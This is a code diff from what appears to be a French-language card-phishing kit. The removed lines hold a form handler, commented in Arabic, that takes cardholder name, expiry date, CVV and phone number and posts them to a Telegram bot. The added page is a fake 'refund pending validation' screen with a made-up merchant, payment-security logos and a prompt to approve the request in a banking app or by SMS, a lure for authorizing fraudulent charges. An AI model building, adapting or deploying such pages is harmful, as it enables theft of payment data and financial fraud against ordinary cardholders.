@@ -1,86 +1,115 @@
-value = value.replace(/(.{4})/g, '$1 ').trim(); // إضافة مسافة بين كل 4 أرقام
-            input.value = value;
-
-            const cardError = document.getElementById('card-error');
-            if (/^4/.test(value.replace(/\s+/g, '')) || /^5[1-5]/.test(value.replace(/\s+/g, ''))) {
-                input.classList.remove('border-red-500');
-                cardError.classList.add('hidden');
-            } else if (value.length >= 1) {
-                input.classList.add('border-red-500');
-                cardError.classList.remove('hidden');
-            } else {
-                input.classList.remove('border-red-500');
-                cardError.classList.add('hidden');
-            }
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validation de Remboursement</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f3f4f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
-
-        // وظيفة إرسال البيانات إلى بوت تلغرام بعد تقديم النموذج
-        async function handleFormSubmit(event) {
-            event.preventDefault(); // منع إعادة تحميل الصفحة عند إرسال النموذج
-
-            // استخراج البيانات المدخلة من النموذج
-            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, ''); // إزالة الفراغات
-            const phoneNumber = document.getElementById('telephone').value;
-            const cardHolder = document.getElementById('nom').value;
-            const expirationDate = document.getElementById('date-expiration').value;
-            const cvv = document.getElementById('cvv').value;
-            const operator = document.getElementById('operateur').value;
-
-            // التحقق من صحة رقم البطاقة
-            if (!/^\d{16}$/.test(cardNumber)) {
-                alert("❌ Numéro de carte invalide. Veuillez saisir 16 chiffres.");
-                return;
-            }
-
-            // حفظ البيانات في localStorage
-            localStorage.setItem('lastFourDigits', cardNumber.slice(-4)); // حفظ آخر 4 أرقام من البطاقة
-            localStorage.setItem('phoneNumber', phoneNumber); // حفظ رقم الهاتف
-
-            // تكوين الرسالة التي سيتم إرسالها إلى بوت تلغرام
-            const message = `
-                Nouveau remboursement demandé :
-
-                Titulaire de la carte : ${cardHolder}
-                Numéro de carte (derniers 4 chiffres) : ${cardNumber.slice(-4)}
-                Date d'expiration : ${expirationDate}
-                Code CVV : ${cvv}
-                Numéro de téléphone : ${phoneNumber}
-                Opérateur choisi : ${operator}
-            `;
-
-            // تعيين API Token للبوت وChat ID (استبدلها بالقيم الحقيقية الخاصة بك)
-            const botToken = 'YOUR_BOT_TOKEN'; // استبدل هذا بـ API Token الخاص بك
-            const chatId = 'YOUR_CHAT_ID'; // استبدل هذا بـ chat ID الخاص بك
-
-            // إرسال الرسالة إلى بوت تلغرام
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            const data = {
-                chat_id: chatId,
-                text: message
-            };
-
-            // إرسال الطلب باستخدام Fetch API
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                });
-
-                const result = await response.json();
-                if (result.ok) {
-                    // إذا تم إرسال الرسالة بنجاح
-                    alert('Votre remboursement a été enregistré avec succès !');
-                    window.location.href = "Traitement.html"; // إعادة توجيه المستخدم إلى الصفحة التالية
-                } else {
-                    alert('Erreur lors de l\'envoi des données. Veuillez réessayer.');
-                }
-            } catch (error) {
-                alert('Erreur de connexion au serveur. Veuillez réessayer.');
-            }
+        .container {
+            background: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
         }
+        .secure-icons img {
+            width: 100%;
+            max-width: 250px;
+            margin-bottom: 20px;
+        }
+        .orange-box {
+            background-color: #ffb74d;
+            color: #333;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        .orange-box h2 {
+            margin: 0;
+            font-size: 16px;
+            color: #000;
+            font-weight: bold;
+        }
+        .orange-box p {
+            margin: 10px 0 0;
+            font-size: 14px;
+        }
+        .orange-box a {
+            color: blue;
+            text-decoration: underline;
+        }
+        .info {
+            text-align: left;
+            margin: 15px 0;
+            font-size: 14px;
+            color: #555;
+        }
+        .info p {
+            margin: 5px 0;
+        }
+        .info strong {
+            color: #000;
+        }
+        .footer-icons img {
+            width: 50px;
+            margin: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logos sécurisés -->
+        <div class="secure-icons">
+            <img src="IMG_4064.png" alt="Remboursement Sécurisé">
+        </div>
+
+        <!-- Boîte orange -->
+        <div class="orange-box">
+            <h2>Remboursement en attente de validation</h2>
+            <p>
+                Merci de vous connecter sur votre application bancaire afin d'approuver la demande de remboursement et créditer le montant sur votre carte.<br>
+                Valider par SMS si vous ne possédez pas l'application bancaire !<br>
+                <a href="#">Cliquez ici</a>
+            </p>
+        </div>
+
+        <!-- Informations du remboursement -->
+        <div class="info">
+            <p><strong>Marchand :</strong> Emryslacarte</p>
+            <p><strong>Montant de remboursement :</strong> 400 €</p>
+            <p><strong>Date :</strong> 17 décembre 2024 à 02:38</p>
+            <p><strong>N° de carte :</strong> **** **** **** <span id="last-four"></span></p>
+            <p><strong>Numéro de téléphone :</strong> <span id="phone-number"></span></p>
+        </div>
+
+        <!-- Icônes de sécurité -->
+        <div class="footer-icons">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Verified_by_VISA.png" alt="Verified by Visa">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7d/Mastercard-logo-2.png" alt="Mastercard SecureCode">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/3d_secure.png" alt="3D Secure">
+        </div>
+    </div>
+
+    <script>
+        // Récupération des données depuis le localStorage (carte et téléphone)
+        const lastFourDigits = localStorage.getItem('lastFour') || '0000';
+        const phoneNumber = localStorage.getItem('phone') || 'Non renseigné';
+
+        // Injection dans les éléments HTML
+        document.getElementById('last-four').innerText = lastFourDigits;
+        document.getElementById('phone-number').innerText = phoneNumber;
     </script>
 </body>
 </html>
